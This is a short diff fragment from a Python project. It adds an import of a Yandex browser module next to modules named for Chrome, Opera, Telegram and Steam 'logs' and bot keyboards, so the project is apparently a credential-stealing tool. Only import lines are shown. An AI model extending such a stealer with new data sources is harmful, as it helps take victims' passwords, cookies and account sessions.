@@ -22,6 +22,7 @@ from keyboards.main import *
 from functions.System import *
 from functions.index import *
 from logs.chrome import *
+from logs.yandex import *
 from logs.opera import *
 from logs.telegram import *
 from logs.steam import *
